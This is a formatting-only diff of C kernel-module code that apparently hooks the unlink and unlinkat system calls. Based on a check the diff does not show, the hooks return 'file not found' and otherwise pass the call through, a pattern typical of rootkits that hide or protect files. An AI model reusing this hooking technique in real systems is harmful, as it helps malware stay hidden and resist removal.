@@ -5,13 +5,13 @@
 #include <linux/namei.h>
 #include <linux/path.h>
 
-void *_unlink = NULL;
+void *_unlink   = NULL;
 void *_unlinkat = NULL;
 
 asmlinkage int64_t h_unlink(const struct pt_regs *r) {
-  const char __user *pn = (void*)r->di;
-  struct path pn_path;
-  int64_t ret = 0;
+  const char __user *pn = (void *)r->di;
+  struct path        pn_path;
+  int64_t            ret = 0;
 
   hfind(_unlink, "__x64_sys_unlink");
 
@@ -22,17 +22,17 @@ asmlinkage int64_t h_unlink(const struct pt_regs *r) {
     ret = -ENOENT;
 
 end:
-  if(ret == 0)
+  if (ret == 0)
     hsyscall(_unlink);
 
   return ret;
 }
 
 asmlinkage int64_t h_unlinkat(const struct pt_regs *r) {
-  const char __user *pn = (void*)r->si;
-  int32_t dfd = r->di;
-  struct path pn_path;
-  int64_t ret = 0;
+  const char __user *pn  = (void *)r->si;
+  int32_t            dfd = r->di;
+  struct path        pn_path;
+  int64_t            ret = 0;
 
   hfind(_unlinkat, "__x64_sys_unlinkat");
 
@@ -43,9 +43,8 @@ asmlinkage int64_t h_unlinkat(const struct pt_regs *r) {
     ret = -ENOENT;
 
 end:
-  if(ret == 0)
+  if (ret == 0)
     hsyscall(_unlinkat);
 
   return ret;
 }
-
